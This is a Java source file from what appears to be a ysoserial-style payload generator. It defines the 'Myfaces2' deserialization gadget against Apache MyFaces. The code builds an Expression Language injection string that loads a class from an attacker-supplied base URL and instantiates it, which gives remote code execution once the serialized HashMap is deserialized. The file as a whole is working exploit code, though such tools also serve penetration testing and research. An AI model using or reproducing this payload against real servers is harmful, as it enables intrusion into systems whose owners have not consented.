package com.h2tg.ysogate.payloads.gadgets;


import com.h2tg.ysogate.payloads.DynamicDependencies;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.utils.JavaVersion;
import com.h2tg.ysogate.utils.PayloadRunner;


/**
 * ValueExpressionImpl.getValue(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression()
 * ValueExpressionMethodExpression.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 * <p>
 * Arguments:
 * - base_url:classname
 * <p>
 * Yields:
 * - Instantiation of remotely loaded class
 * <p>
 * Requires:
 * - MyFaces
 * - Matching EL impl (setup POM deps accordingly, so that the ValueExpression can be deserialized)
 *
 * @author mbechler
 */
@Authors({Authors.MBECHLER})
public class Myfaces2 implements CommandObjectPayload<Object>, DynamicDependencies {

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAtLeast(7);
	}

	public static String[] getDependencies() {
		return Myfaces1.getDependencies();
	}


	public Object getObject(String command) throws Exception {
		int sep = command.lastIndexOf(':');
		if (sep < 0) {
			throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
		}

		String url       = command.substring(0, sep);
		String className = command.substring(sep + 1);

		// based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
		String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";

		// if we add fewer than the actual classloaders we end up with a null entry
		for (int i = 0; i < 100; i++) {
			expr += "${request.getAttribute('arr').add(request.servletContext.getResource('/').toURI().create('" + url + "').toURL())}";
		}
		expr += "${request.getClass().getClassLoader().newInstance(request.getAttribute('arr')"
				+ ".toArray(request.getClass().getClassLoader().getURLs())).loadClass('" + className + "').newInstance()}";

		return Myfaces1.makeExpressionPayload(expr);
	}

	public static void main ( final String[] args ) throws Exception {
		PayloadRunner.run(Myfaces2.class, args);
	}
}
